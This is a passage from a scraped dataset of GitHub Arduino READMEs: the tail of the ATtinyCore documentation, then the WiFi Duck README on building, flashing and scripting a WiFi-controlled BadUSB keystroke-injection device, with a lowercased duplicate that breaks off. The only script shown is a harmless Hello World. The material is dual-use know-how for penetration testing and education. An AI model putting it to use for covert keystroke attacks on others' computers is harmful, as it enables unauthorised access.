mosi. when operating in slave mode, di is mosi and do is miso. the #defines for miso and mosi assume master mode (as this is much more common). clock dividers 2, 4, 8 and >=14 are implemented as separate routines; call spisettings or setclockdivider with a constant value to use less program space, otherwise, all routines will be included along with 32-bit math. clock dividers larger than 14 are only approximate because the routine is optimized for size, not exactness. also, interrupts are not disabled during data transfer as spi clock doesn't need to be precise in most cases. if you use long interrupt routines or require consistent clocking, wrap calls to transfer in atomic_block. be aware that usi-based i2c is not available when usi-based spi is in use.\nattiny x5 (25/45/85)\nattiny x4 (24/44/84)\nattiny x61 (262/461/861)\nattiny x7 (87/167)\nattiny x313 (2313/4313)\nattiny1634\nserial support\non the following chips, full serial (uart) support is provided in hardware, as serial (and serial1 for parts with two serial ports):\nattiny x313 (2313/4313)\nattiny x7 (87/167 - lin support, including a very fancy baud rate generator)\nattiny x41 (441/841 - two uarts)\nattiny1634 (two uarts)\nattiny828\non the following chips, no hardware serial is available, however, a built-in software serial named serial is provided to maximize compatibility. this uses the analog comparator pins (to take advantage of the interrupt, since very few sketches/libraries use it, while lots of sketches/libraries use pcints). tx is ain0, rx is ain1 - this is a software implementation - as such, you cannot receive and send at the same time. if you try, you'll get gibberish, just like using softwareserial. see also the discussion of baud rates.\nattiny x5 (25/45/85)\nattiny x4 (24/44/84)\nattiny x61 (261/461/861)\nattiny x8 (48/88)\nattiny43\nthis core is also fully compatible with the usual softwareserial library if you want a software serial port on a different pin - however, you can still only transmit or receive on a single software serial instance at a time - on parts without hardware serial, this includes the builtin software serial \"serial\" implementation noted above.\nwarning: internal oscillator and serial note that when using the internal oscillator or pll clock, you may need to tune the chip (using one of many tiny tuning sketches) and set osccal to the value the tuner gives you on startup in order to make serial (software or hardware) work at all - the internal clock is only calibrated to +/- 10% in most cases, while serial communication requires it to be within just a few percent. however, in practice, a larger portion of parts work without tuning than would be expected from the spec. that said, for the attiny x4, x5, x8, and x61-family i have yet to encounter a chip that was not close enough for serial using the internal oscillator at 3.3-5v at room temperature - this is consistent with the typical characteristics section of the datasheet, which indicates that the oscillator is fairly stable w/respect to voltage, but highly dependent on temperature.\nthe attiny x41-family, 1634r, and 828r have an internal oscillator factory calibrated to +/- 2% - but only at operating voltage below 4v. above 4v, the oscillator gets significantly faster, and is no longer good enough for uart communications. the 1634 and 828 (non-r) are not as tightly calibrated (so they may need tuning even at 3.3v) and are a few cents less expensive, but suffer from the same problem at higher voltages. due to these complexities, it is recommended that those planning to use serial (except on a x41, 1634r or 828r at 2.5~3.3v, or with a micronucleus bootloader) use an external crystal until a tuning solution is available.\na tuning sketch is planned for a future version of this core. progress on this has been made - slowly and fitfully. the current plan is for optiboot bootloader to be optionally burnable with a \"tuning\" sketch - this will write the calibration value to the space between the end of the bootloader and the end of flash, and the bootloader will load this value if it is set. ( #139 ) micronucleus using internal oscillator already does this using the usb clock as a timebase, and loads it before the sketch\nadc support\nall of the supported parts except for the x313-family have an analog to digital converter on chip. single-ended adc inputs can be read using the adc channel number or the ax constant (they can not be read using the digital pin number). in addition to the single-ended input channels marked on the pinout diagrams, many also support differential adc input channels. to use these, simply call analogread() with the appropriate adc channel number. to get the adc channel number, refer to the datasheet - it is listed in the register description section of the chapter on the adc, under the admux register.''\ntimers and pwm\nall of the supported parts have hardware pwm (timer with output compare functionality) on at least one pin. see the part-specific documentation pages for a chart showing which pins have pwm. in addition to pwm, the on-chip timers are also used for millis() (and other timekeeping functions) and tone() - as well as by many libraries to achieve other functionality. typically, a timer can only be used for one purpose at a time.\non all supported parts, timekeeping functions are on timer0. on all parts except the tiny841/441 tone() is on timer1; on 841/441, in version 1.1.6 and later, tone() is on timer2 to improve compatibility (on 1.1.5 and earlier, tone() is on timer1 on all parts). this means that reconfiguring timer0 by manipulating it's registers will break millis() and delay(). using tone() will prevent pwm from working on pwm pins controlled by timer1 (timer2 for 841/441), and manipulating it's registers will break tone(). because tone() is now on timer2 on the 841/441, you can use tone() at the same time as other libraries that use timer1 (such as servo, timerone, and many others).\nmost of the attiny parts only have two timers. the attiny841 has a third timer - but be aware that it's timer2 is very different from the timer2 on the atmega328p and most other atmega parts - the '841 has a second 16-bit timer (identical to timer1), while the atmega parts usually have an 8-bit asynchronous timer. this means that libraries designed to use timer2 on the usual arduino boards (ex, servotimer2) cannot be used with the 841.\nbuilt-in tinyneopixel library\nthe standard neopixel (ws2812/etc) libraries do not support all the clock speeds that this core supports, and some of them only support certain ports. this core includes two libraries for this, both of which are tightly based on the adafruit_neopixel library, tinyneopixel and tinyneopixel_static - the latter has a few differences from the standard library (beyond supporting more clocks speeds and ports), in order to save flash. at speeds below 16mhz, you must select the port containing the pin you wish to use from the tools -> tinyneopixel port menu. this code is not fully tested at \"odd\" clock speeds, but definitely works at 8/10/12/16/20 mhz, and will probably work at other speeds, as long as they are 7.3728 mhz or higher. see the tinyneopixel documentation and included examples for more information.\nretain eeprom configuration option\nall non-bootloader board definitions have a menu option to control whether the contents of the eeprom are erased when programming. this only applies to isp programming, and you must \"burn bootloader\" to set the fuses to apply this. because it only applies to isp programming, it is not available for bootloader board definitions. on those, eeprom is never retained, on the reasoning that if you are burning the bootloader to a chip, you are trying to restore it to a \"fresh\" state.\nb. o. d. (brown out detect) configuration option\nbrown-out detection continuously monitors vcc, and holds the chip in reset state (bor) if the applied voltage is below a certain threshold. this is a good idea with slow-rising power supplies or where it is expected that the supply voltage could droop below the required operating voltage for the frequency it is running at (see the speed grade specification for the part you're using) - without bod enabled, this can put the chip into a hung state until manually reset. however, bod increases power consumption slightly, and hence may be inappropriate in low power applications.\nthe bod voltage trigger level can be chosen from the tools -> bod menu. the attiny441, 841, 828, and 1634 support independently configuring the bod mode (active, sampled, disabled) for active and sleep modes (see the applicable datasheet for details). these are configured via the tools -> bod mode (sleep) and tools -> bod mode (active) menus.\nin all cases, the selected bod option(s) is/are configured by the fuses, so after changing these, you must \"burn bootloader\" to set the fuses.\nfor micronucleus boards, only options with are vaguely close to manufacturer's spec and \"disabled\" are available - since with those parts, we know without a doubt what that the clock speed will be, we know what bod levels would be appropriate. there's not much point to using bod if the bod level is so far below spec that the chip would stop running before it was reached.\noption to disable millis()/micros()\nthe tools -> millis()/micros() allows you to enable or disable the millis() and micros() timers. if set to enable (the default), millis(), micros() will be available. if set to disable, these will not be available, serial methods which take a timeout as an argument will not have an accurate timeout (though the actual time will be proportional to the timeout supplied); delay will still work. disabling millis() and micros() saves flash, and eliminates the millis interrupt every 1-2ms; this is especially useful on parts with very limited flash, as it saves a few hundred bytes.\nmemory lock bits, disabling reset\nattinycore will never set lock bits automatically, nor will it set fuses to disable isp programming (it is intentionally not made available as an option, since after doing that, an hvsp programmer is needed to further reprogram the chip, and inexperienced users would be at risk of bricking their chips this way). the usual workflow when these bits are in use is set other fuses -> upload -> test -> set the lockbits and/or fuses. this can be done from the command line using avrdude. to expedite the process, you can enable \"verbose upload\" in preferences, do \"burn bootloader\" (the board and/or programmer does not need to be present), scroll to the top of the output window - the first line is the avrdude command used to burn the bootloader, including the paths to all the relevant files. it can be used as a template for the command you execute to set the fuse/lock bits. disabling of reset is currently not an option, either - but for bootloader boards, this may change - vusb bootloaders which disable reset are in widespread use, seemingly without issue. it will never be an option for non-bootloader boards because of the convoluted workflow required.\npin mappings\nattiny441/841\nattiny1634\nattiny828\nattiny25/45/85\nattiny24/44/84\nattiny261/461/861\nattiny87/167\nattiny48/88\nattiny2313/4313\nattiny43u\nnote that two pin mappings are supported for some devices to retain backwards compatibility with other cores - the pin mapping may be chosen from a menu.\nnote that analog pin numbers (ex a0 ) cannot be used with digitalwrite()/digitalread()/analogwrite() - all pins have a digital pin number. analog pin number should only be used for analogread() - this represents a departure from the behavior used in the official avr boards. this enables us to expose the advanced adc functionality available on some of the attiny parts with minimal impact, as clearly written code is unlikely to fall afoul of this anyway.\nbuy breakout boards\nexcept for the x5, x4, x61, and x313-family, these are only available in surface mount packages. breakout boards are available from my tindie store (these are the breakout boards used for testing this core), which have the pins numbered to correspond with the pin numbers used in this core. where applicable, all of these assembled boards have the bootloader installed, and all are set to run at the advertised speed (most are available with several speed/voltage combinations).\n841: bare boards - assembled boards\n1634: bare boards - assembled boards\n828: bare boards assembled boards\nx61-family (861/461/261): bare boards assembled boards\nx7-family (167/87): bare boards assembled boards\nx8-family (48/88): bare boards assembled boards\nattiny43 (including boost converter) assembled boards\nsmd/dip or dip attiny85 prototyping board\nsmd or dip attiny84 prototyping board\ncaveats\nsome people have problems programming the 841 and 1634 with usbasp and tinyisp - but this is not readily reproducible. arduinoasisp works reliably. in some cases, it has been found that connecting reset to ground while using the isp programmer fixes things (particularly when using the usbasp with extremeburner avr) - if doing this, you must release reset (at least momentarily) after each programming operation. this may be due to bugs in usbasp firmware - see this thread on the arduino forums for information on updated usbasp firmware: http://forum.arduino.cc/index.php?topic=363772 (links to the new firmware are on pages 5-6 of that thread - the beginning is largely a discussion of the inadequacies of the existing firmware)\nat >4v, the speed of the internal oscillator on 828r, 1634r and 841 parts increases significantly - enough that serial (and hence the bootloader) does not work. significant enhancements have been made on this front in 1.4.0; reburning bootloader should sort it out.\nlicense\nattinycore itself is released under the lgpl 2.1. it may be used, modified, and distributed, and it may be used as part of an application which, itself, is not open source (though any modifications to these libraries must be released under the lgpl as well). unlike lgplv3, if this is used in a commercial product, you are not required to provide means for user to update it. a historical investigation has determined that versions of this core have been released under the lgplv2.1 in the past - it was an oversight on our part that the license file was omitted from this core previously.\nthe attinycore hardware package (and by extension this repository) contains attinycore as well as libraries and bootloaders. these are released under the same license, unless specified otherwise. for example, tinyneopixel and tinyneopixel_static, being based on adafruit's library, is released under gplv3, as described in the license.md in those subfolders and within the body of the library files themselves.\nthis does not apply to any tools or third party programs used by attinycore. installing attinycore through board manager will install and/or update other tool(s) to compile and/or upload code. those are covered by separate licenses included in their respective archives.\nacknowledgements\nthis core was originally based on tcworld's attinycore, which is in turn based on the arduino-tiny core here: http://code.google.com/p/arduino-tiny/ the attiny841 support is based on shimniok's attiny x41 core, and the 1634 support on rambo's attiny1634 core.\\\n@per1234, who has been an invaluable resource for myself and others within the arduino community, specifically having set up the travis-based ci testing system (which will cease to be used once the other foot drops wrt. travis terms) and his years of assistance with board manager releases and more.\nthe pinout diagrams are created by @mcudude, who maintains a number of excellent cores for virtually every microcontroller you might want to use with arduino as as it has \"atmega\" in the name - http://github.com/mcudude\nmany individuals have contributed various fixes and improvements via github - see the contributor list for the full list.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000042, "year": null}, {"Unnamed: 0": 2084, "autor": 44, "date": null, "content": "WiFi Duck\nAbout\nUsage\nSupport us\nBuy Hardware\nMalduino W\nDSTIKE WiFi Duck\nDIY Hardware\nAtmega32u4 Development Boards\nESP8266 Development Boards\nConnections\nPCB\nFlash Software\nFlash Atmega32u4\nFlash ESP8266\nUnbrick Atmega32u4\nScripting\nBasics\nFunctions\nStandard Keys\nModifier Keys\nOther Keys\nExamples\nCLI Commands\nGeneral\nSPIFFS File Management\nHow to Debug\nDevelopment\nEdit Web Files\nTranslate Keyboard Layout\nDisclaimer\nLicense\nCredits\nAbout\nThis open-source project aims to provide a user-friendly tool to learn about keystroke injection attacks and 'BadUSBs'.\nBy emulating a USB keyboard, tools like this can gain full access to any computer with a USB port in a matter of seconds!\nThis is made possible by the fact that keyboards are trusted by computers. You can have full control over a computer with just a keyboard.\nA BadUSB pretends to be a keyboard to the computer to send keystrokes. But unlike a human, it can type hundreds of characters per second. By using a simple scripting language, it's easy to make BadUSBs type whatever you want.\nWith the WiFi Duck, you can simply connect via WiFi to manage all scripts from within a web interface. This means that, unlike other BadUSBs, you don't need to install an app, log in, compile or copy scripts to an SD card.\nUsage\nWatch the full video\nPlug in your WiFi Duck\nConnect to the WiFi network wifiduck with the password wifiduck\nOpen a browser and visit 192.168.4.1\nWrite, save and run your first Ducky Script\n[Recommended] Open Settings (top right corner) and update SSID and password\nHelp I forgot the password: Flash the ESP8266, but make sure that you select Erase Flash: Sketch + WiFi Settings under Tools in the Arduino IDE.\nIf you have further questions, check out the issue section.\nSupport us\nHey, do you like this kind of project?\nIt took a huge amount of effort to create!\nTo make sure we can keep working on free and open-source projects like this,\nplease consider becoming a \u2764\ufe0f Sponsor or support us via \u2615 Ko-fi.\nVisit spacehuhn.com to learn more about us. \ud83d\udc14\nBuy Hardware\nMalduino W\nGo to Maltronics.com\nA nicely encased, inconspicuous looking BadUSB by Maltronics.\nHaving USB-A and USB-C makes it compatible with all kind of devices.\nIt comes flashed with the WiFi Duck firmware and works plug and play.\n\u2139\ufe0f Documentation can be found here\nDSTIKE WiFi Duck\nGot to DSTIKE.com\nA custom designed development board which comes preflashed with this software by Travis Lin.\nYou can update the ESP8266 over the air and flash the Atmega32u4 via Arduino, all while enclosed in its neat little case.\n\ud83d\udcfa Watch the How to Update Tutorial here.\nIf you wish to develop your own software or help improve this one, the 8-bit DIP-switch makes it easy for you to access the Atmega32u4 or ESP8266 independently. For more info see Flash Software.\nMode Atmega32u4 ESP8266 DIP-switch Image\nDefault Operating Mode USB On 10101101\nAtmega32u4 Flash Mode USB Off 10101010\nESP8266 Flash Mode Off USB 01011101\nDIY Hardware\nWatch the video tutorial\nTo build a WiFi Duck yourself, you need the following hardware:\nAn Atmega32u4 development board (see the list below)\nAn ESP8266 or ESP8285 development board (see the list below)\nOptional: A single Neopixel (WS2812b) or Dotstar (APA102) LED\nTo flash the microcontrollers you need a computer and USB cable.\nIf you're a beginner, it's recommended you wire everything together on a breadboard first!\nIn this case, you'd also need a breadboard with a couple of jumper wires.\nIf you wish to solder everything together into a small gadget, you also need soldering equipment.\nYou can use any Atmega32u4 or ESP8266 based development board, but if you have no idea where to start, here's a list.\n\u26a0\ufe0f Keep in mind that you will need both microcontrollers!\nThe Atmega32u4 to act as USB keyboard, and the ESP8266 for WiFi.\nAtmega32u4 Development Boards\nArduino Leonardo\nArduino Micro\nSparkfun Pro Micro\nCJMCU Beetle\nSS Micro\n\u203c\ufe0f DIGISPARK or other ATTINY85 based development boards, are NOT supported! \u203c\ufe0f\nESP8266 Development Boards\nNodeMCU 1.0 (ESP-12E Module)\nLOLIN(WEMOS) D1 Mini\nLOLIN(WEMOS) D1 Mini Pro\nLOLIN(WEMOS) D1 Mini Lite\nConnections\nA map of pins that need to be connected.\nESP8266 Atmega32u4\nD1 alias GPIO 5 3 alias SCL\nD2 alias GPIO 4 2 alias SDA\nGND GND\nIdeally, you want the Atmega32u4 to power the ESP8266, so it can run on one USB connection, instead of having to always plug in both.\nTo share power between both chips, you need a voltage regulator that takes 5V and turns it into 3.3V.\nThat's because USB runs on 5V, but the ESP8266 only takes 3.3V. Luckily most development boards have such a regulator on board.\nDO NOT CONNECT ESP8266 VCC to the ATMEGA32u4 VCC, it will kill the ESP826. Instead look for the 5V or VIN pin on your dev board, as those will be connected to the regulator.\nESP8266 Dev Board Atmega32u4\n5V or VIN RAW, 5V or VIN\nTo add a Neopixel (WS2812b) LED:\nAtmega32u4 Neopixel LED\n7* DI alias Data, In\n5V alias VCC 5V alias VCC\nGND GND\n* The Data pin can be changed later on in the software, pin 7 is just an example.\nPCB\nTo make the DIY process easier, I designed a little PCB.\nYou solder a Pro Micro board on one side and a Wemos d1 mini or NodeMCU board (depending on the PCB) on the other side.\nThat's it. You don't even have to solder all pins, just the ones mentioned in Connections, excluding the LED.\nDesign Files:\nPro Micro + Wemos d1 mini: https://easyeda.com/Spacehuhn/wifi-duck\nPro Micro + NodeMCU: https://easyeda.com/Spacehuhn/diy-wifi-duck-pro-micro-nodemcu\nYou can also order them on OSHPark:\nPro Micro + Wemos d1 mini: https://oshpark.com/shared_projects/ARCED9je\nPro Micro + NodeMCU: https://oshpark.com/shared_projects/XUuUH1HB\nFlash Software\nWatch the video tutorial\nDownload and install the Arduino IDE.\nStart the Arduino IDE, go to File > Preferences.\nAt Additional Board Manager ULRs enter https://raw.githubusercontent.com/SpacehuhnTech/arduino/main/package_spacehuhn_index.json. You can add multiple URLs, separating them with commas.\nGo to Tools > Board > Board Manager, search for wifi duck and install WiFi Duck AVR Boards and WiFi Duck ESP8266 Boards.\nDownload and extract this repository or git clone it.\nIf you can't find the COM port of ESP8266 board, then you're probably missing the right drivers. Here are links to drivers of the 2 most used UART chips on ESP8266 development boards:\n\ud83d\udcbe CP2102\n\ud83d\udcbe CH340\nFlash Atmega32u4\nOpen atmegaduck/atmega_duck.ino with the Arduino IDE.\nUnder Tools > Board in the WiFi Duck AVR section, select your board; for example, Sparkfun Pro Micro.\nConnect the Atmega32u4 board via USB and select its port under Tools > Port.\nOptional: Under Tools you can enable the LED and set its pin. You can also change the USB ID to make it appear as a certain type of keyboard.\nPress Upload.\nFlash ESP8266\nOpen esp_duck/esp_duck.ino with the Arduino IDE.\nUnder Tools > Board in the WiFi Duck ESP8266 section, select your board. For example NodeMCU 1.0 (ESP-12E Module).\nConnect the ESP8266 board via USB and select its port under Tools > Port.\nPress Upload.\nPro Tip: If the ESP8266 is already running this software and you just want to update it, you don't have to connect it via USB. You can update it over the air! Simply connect to the wifiduck network (default password is wifiduck).\nThen in Arduino at Tools > Port you should now see a network port. Select it and press Upload.\nNote: After the initial flashing, the ESP8266 has to format its memory, so it might take a minute until it's fully ready.\nIf you connected the RGB LED:\nBlue LED = Connection working\nGreen LED = Device ready\nUnbrick Atmega32u4\nIf you flashed your Atmega32u4 board with the wrong bootloader, it will no longer appear in the port selection after you connect it.\nTo solve this, you need to:\nConnect the reset pin RST to ground GND. Preferably with a jumper wires, because you need to be able to disconnect it quickly.\nOpen a sketch, atmegaduck/atmega_duck.ino or an empty sketch.\nMake sure to have the correct board selected under Tools > Board!\nConnect the board with the wire still connected.\nPress Upload and as soon as you see Compiling... turn to Uploading..., disconnect the wire.\nNow it should flash the sketch and the correct bootloader.\nScripting\nBasics\nKeys are separated by a single space.\nEverything written in a single line gets pressed and released at the same time.\nTo write text, use the STRING function.\nIt's compatible to Ducky Script, which was developed by the wonderful people at Hak5.\nExample Explanation\nWINDOWS\nr Type the Windows key and then the r key\nWINDOWS r Press the Windows key and the r key simultaneously\nSTRING WINDOWS r Write WINDOWS r\nFunctions\nCommand Example Description\nREM REM Hello World! Comment\nDEFAULTDELAY or DEFAULT_DELAY DEFAULTDELAY 200 Time in ms between every command\nDELAY DELAY 1000 Delay in ms\nSTRING STRING Hello World! Types the following string\nREPEAT or REPLAY REPEAT 3 Repeats the last command n times\nLOCALE LOCALE DE Sets the keyboard layout. Available: DE, ES, GB, US, DK, RU, FR\nKEYCODE KEYCODE 0x02 0x04 Types a specific key code (modifier, key1[, ..., key6]) in decimal or hexadecimal\nLED LED 40 20 10 Changes the color of the LED in decimal RGB values (0-255)\nStandard Keys\nKey\na - z\nA - Z\n0 - 9\nF1 - F12\nModifier Keys\nKey\nCTRL or CONTROL\nSHIFT\nALT\nWINDOWS or GUI\nOther Keys\nKey\nENTER\nMENU or APP\nDELETE\nHOME\nINSERT\nPAGEUP\nPAGEDOWN\nUP or UPARROW\nDOWN or DOWNARROW\nLEFT or LEFTARROW\nRIGHT or RIGHTARROW\nTAB\nEND\nESC or ESCAPE\nSPACE\nPAUSE or BREAK\nCAPSLOCK\nNUMLOCK\nPRINTSCREEN\nSCROLLLOCK\nExamples\nREM Hello World for Windows PCs\nDEFAULTDELAY 200\nGUI r\nSTRING notepad\nENTER\nSTRING Hello World!\nCLI Commands\nThe command line interface or CLI is accessible using a serial connection to the ESP8266 (115200 baud, Newline ending) or via the web interface at 192.168.4.1/terminal.html.\nGeneral\nCommand Description Example\nhelp Returns all available commands help\nram Returns available memory in bytes ram\nversion Returns version number version\nsettings Returns list of settings settings\nset -n/ame -v/alue Sets value of a specific setting set ssid \"why fight duck\"\nreset Resets all settings to their default values reset\nstatus Returns status of i2c connection with Atmega32u4 status\nrun <...> Starts executing a Ducky script run example.txt\nstop <...> Stops executing a Ducky script stop example.txt\nSPIFFS File Management\nCommand Description Example\nmem Returns available, used and free memory of SPIFFS in bytes mem\nformat Formats SPIFFS format\nls <...> Returns list of files ls /\ncreate <...> Creates file create example.duck\nremove <...> Deletes file remove example.duck\ncat <...> Returns content of file cat example.duck\nrename -fileA,a -fileB,b Renames file rename example.duck example.txt\nwrite -f/ile -c/ontent Writes (appends) data to file write example.txt \"Hello World!\"\nstream <...> Opens file stream stream example.txt\nclose Closes file stream close\nread Read and return the result from file stream read\nIf a stream is open, everything you type (except messages containing exactly close or read) will be written to the file until you type close!\nHow to Debug\nTo properly debug, you need to have both the Atmega32u4 and the ESP8266 connected via USB to your computer.\nThat can be tricky when you only have a all in one board, so it might be useful you built one yourself. You don't need to solder it, for example you can use an Arduino Leonardo and a NodeMCU and connect them with jumper cables.\nNow open 2 instances of Arduino (so they run as separate processes!), select the COM port and open the serial monitor for each device. You might need to reset the Atmega32u4 to see serial output. If that causes problems with the i2c connection, try to reset the ESP8266 too.\nDevelopment\nEdit Web Files\nIf you would like to modify the web interface, you can!\nThe web/ folder contains all .html, .css, .js files.\nYou can edit and test them locally as long as you're connected to the WiFi Duck network thanks to the websocket connection handled by JavaScript in the background.\nTo get the new files onto the ESP8266, run python3 webconverter.py in the repository folder.\nIt gzips all files inside web/, converts them into a hex array and saves it in esp_duck/webfiles.h.\nNow you just need to flash the ESP8266 again.\nTranslate Keyboard Layout\nCurrently supported keyboard layouts:\n\ud83c\udde9\ud83c\uddea DE\n\ud83c\uddec\ud83c\udde7 GB\n\ud83c\uddfa\ud83c\uddf8 US\n\ud83c\uddea\ud83c\uddf8 ES\n\ud83c\udde9\ud83c\uddf0 DK\n\ud83c\uddf7\ud83c\uddfa RU\n\ud83c\uddeb\ud83c\uddf7 FR\n\ud83c\udde7\ud83c\uddea BE (ASCII only)\n\ud83c\uddf5\ud83c\uddf9 PT (ASCII only)\n\ud83c\uddee\ud83c\uddf9 IT\n\ud83c\uddf8\ud83c\uddf0 SK\n\ud83c\udde8\ud83c\uddff CZ\nAll standard keys are defined in usb_hid_keys.h.\nTo translate a keyboard layout, you have to match each character on your keyboard to the one(s) of a US keyboard.\nThis stuff is hard to explain in writing and requires a lot of manual work and testing.\nCopy one of the existing layouts files, like locale_us.h.\nPreferably one that is close to your keyboard layout, it will save you time!\nAdd #include \"locale_xx.h\" to the end of the locales.h file.\nRename the file and its variables to your language code. For example:\nlocale_xx.h -> locale_de.h,\nascii_xx -> ascii_de,\nlocale_xx -> locale_de,\nextended_ascii_xx -> extended_ascii_de,\nutf8_xx -> utf8_de.\nModify the ASCII array.\nThe ASCII array has a fixed size. Each row describes a key. First a modifier key like KEY_MOD_LSHIFT, then a character key. Some ASCII characters can't be typed or don't require a modifier, that's where you must place KEY_NONE. Check usb_hid_keys.h for the available keys.\nIf multiple modifiers are required, you must use a bitwise OR to connect them: KEY_MOD_RALT | KEY_MOD_LSHIFT.\nFor example, in locale_de.h Z is saved as KEY_MOD_LSHIFT, KEY_Y.\nThis is because German keyboards use QWERTZ instead of the QWERTY layout and since the letter is uppercase, shift must be pressed as well.\nThankfully you don't have to trial and error everything, the Hak5 Community translated a lot of layouts already here. It's just written in a different syntax. For example, ASCII_20 (20 in hexadecimal) is the 32th character in our ascii array.\nModify or create the extended ASCII array.\nThe extended ASCII array doesn't have a fixed size and is only as long as you make it. First the character code. For example, \u00e4 has the index 132, or 84 in hex. It doesn't use a modifier and sits where the apostrophe key is on a US keyboard: 0x84, KEY_NONE, KEY_APOSTROPHE, // \u00e4.\nModify or create the UTF-8 array.\nThe UTF-8 array is variable in length, too.\nThe first 4 bytes are the character code.\nFor example, \u00c4 has the hex code c384 or 0xc3 0x84. The other 2 bytes are not used so we set them to 0. Because the letter is uppercase, we need to press the shift key and like before, the letter is typed by pressing the same key as the apostrophe key of a US keyboard: 0xc3, 0x84, 0x00, 0x00, KEY_MOD_LSHIFT, KEY_APOSTROPHE, // \u00c4.\nEdit the hid_locale_t structure.\nIf you renamed all variables accordingly, there's nothing left to do.\nGo to duckparser.cpp at // LOCALE (-> change keyboard layout) you can see a bunch of else if statements. You need to copy one for your layout.\nBefore adding GB layout:\nif (compare(w->str, w->len, \"US\", CASE_SENSETIVE)) {\nkeyboard::setLocale(&locale_us);\n} else if (compare(w->str, w->len, \"DE\", CASE_SENSETIVE)) {\nkeyboard::setLocale(&locale_de);\n}\nAfter adding GB layout:\nif (compare(w->str, w->len, \"US\", CASE_SENSETIVE)) {\nkeyboard::setLocale(&locale_us);\n} else if (compare(w->str, w->len, \"DE\", CASE_SENSETIVE)) {\nkeyboard::setLocale(&locale_de);\n} else if (compare(w->str, w->len, \"GB\", CASE_SENSETIVE)) {\nkeyboard::setLocale(&locale_gb);\n}\nTest your layout with a Ducky Script that contains all characters of your keyboard. For example:\nLOCALE DE\nSTRING !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_abcdefghijklmnopqrstuvwxyz{|}~\u00b2\u00b3\u00e4\u00f6\u00fc\u00c4\u00d6\u00dc\u00df\u20ac\u00b0\u00a7`\nENTER\nAdd a link to your layout to README, to web/index.html and please feel free to improve this tutorial to help future translators!\nCreate a Pull Request\nDisclaimer\nThis tool is intended to be used for testing, training, and educational purposes only.\nNever use it to do harm or create damage!\nThe continuation of this project counts on you!\nLicense\nThis software is licensed under the MIT License. See the license file for details.\nCredits\nSoftware libraries used in this project:\nArduino\nNeopixel Library\nDotstar Library\nAVR, ESP8266 & SAMD Arduino Core\nESPAsyncTCP\nESPAsyncWebServer\nSimpleCLI", "link": "https://github.com/SpacehuhnTech/WiFiDuck", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "wifi duck\nabout\nusage\nsupport us\nbuy hardware\nmalduino w\ndstike wifi duck\ndiy hardware\natmega32u4 development boards\nesp8266 development boards\nconnections\npcb\nflash software\nflash atmega32u4\nflash esp8266\nunbrick atmega32u4\nscripting\nbasics\nfunctions\nstandard keys\nmodifier keys\nother keys\nexamples\ncli commands\ngeneral\nspiffs file management\nhow to debug\ndevelopment\nedit web files\ntranslate keyboard layout\ndisclaimer\nlicense\ncredits\nabout\nthis open-source project aims to provide a user-friendly -----> tool !!!  to learn about keystroke injection attacks and 'badusbs'.\nby emulating a usb keyboard, tools like this can gain full access to any computer with a usb port in a matter of seconds!\nthis is made possible by the fact that keyboards are trusted by computers. you can have full control over a computer with just a keyboard.\na badusb pretends to be a keyboard to the computer to send keystrokes. but unlike a human, it can type hundreds of characters per second. by using a simple scripting language, it's easy to make badusbs type whatever you want.\nwith the wifi duck, you can simply connect via wifi to manage all scripts from within a web interface. this means that, unlike other badusbs, you don't need to install an app, log in, compile or copy scripts to an sd card.\nusage\nwatch the full video\nplug in your wifi duck\nconnect to the wifi network wifiduck with the password wifiduck\nopen a browser and visit 192.168.4.1\nwrite, save and run your first ducky script\n[recommended] open settings (top right corner) and update ssid and password\nhelp i forgot the password: flash the esp8266, but make sure that you select erase flash: sketch + wifi settings under tools in the arduino ide.\nif you have further questions, check out the issue section.\nsupport us\nhey, do you like this kind of project?\nit took a huge amount of effort to create!\nto make sure we can keep working on free and open-source projects like this,\nplease consider becoming a \u2764\ufe0f sponsor or support us via \u2615 ko-fi.\nvisit spacehuhn.com to learn more about us. \ud83d\udc14\nbuy hardware\nmalduino w\ngo to maltronics.com\na nicely encased, inconspicuous looking badusb by maltronics.\nhaving usb-a and usb-c makes it compatible with all kind of devices.\nit comes flashed with the wifi duck firmware and works plug and play.\n\u2139\ufe0f documentation can be found here\ndstike wifi duck\ngot to dstike.com\na custom designed development board which comes preflashed with this software by travis lin.\nyou can update the esp8266 over the air and flash the atmega32u4 via arduino, all while enclosed in its neat little case.\n\ud83d\udcfa watch the how to update tutorial here.\nif you wish to develop your own software or help improve this one, the 8-bit dip-switch makes it easy for you to access the atmega32u4 or esp8266 independently. for more info see flash software.\nmode atmega32u4 esp8266 dip-switch image\ndefault operating mode usb on 10101101\natmega32u4 flash mode usb off 10101010\nesp8266 flash mode off usb 01011101\ndiy hardware\nwatch the video tutorial\nto build a wifi duck yourself, you need the following hardware:\nan atmega32u4 development board (see the list below)\nan esp8266 or esp8285 development board (see the list below)\noptional: a single neopixel (ws2812b) or dotstar (apa102) led\nto flash the microcontrollers you need a computer and usb cable.\nif you're a beginner, it's recommended you wire everything together on a breadboard first!\nin this case, you'd also need a breadboard with a couple of jumper wires.\nif you wish to solder everything together into a small gadget, you also need soldering equipment.\nyou can use any atmega32u4 or esp8266 based development board, but if you have no idea where to start, here's a list.\n\u26a0\ufe0f keep in mind that you will need both microcontrollers!\nthe atmega32u4 to act as usb keyboard, and the esp8266 for wifi.\natmega32u4 development boards\narduino leonardo\narduino micro\nsparkfun pro micro\ncjmcu beetle\nss micro\n\u203c\ufe0f digispark or other attiny85 based development boards, are not supported! \u203c\ufe0f\nesp8266 development boards\nnodemcu 1.0 (esp-12e module)\nlolin(wemos) d1 mini\nlolin(wemos) d1 mini pro\nlolin(wemos) d1 mini lite\nconnections\na map of pins that need to be connected.\nesp8266 atmega32u4\nd1 alias gpio 5 3 alias scl\nd2 alias gpio 4 2 alias sda\ngnd gnd\nideally, you want the atmega32u4 to power the esp8266, so it can run on one usb connection, instead of having to always plug in both.\nto share power between both chips, you need a voltage regulator that takes 5v and turns it into 3.3v.\nthat's because usb runs on 5v, but the esp8266 only takes 3.3v. luckily most development boards have such a regulator on board.\ndo not connect esp8266 vcc to the atmega32u4 vcc, it will kill the esp826. instead look for the 5v or vin pin on your dev board, as those will be connected to the regulator.\nesp8266 dev board atmega32u4\n5v or vin raw, 5v or vin\nto add a neopixel (ws2812b) led:\natmega32u4 neopixel led\n7* di alias data, in\n5v alias vcc 5v alias 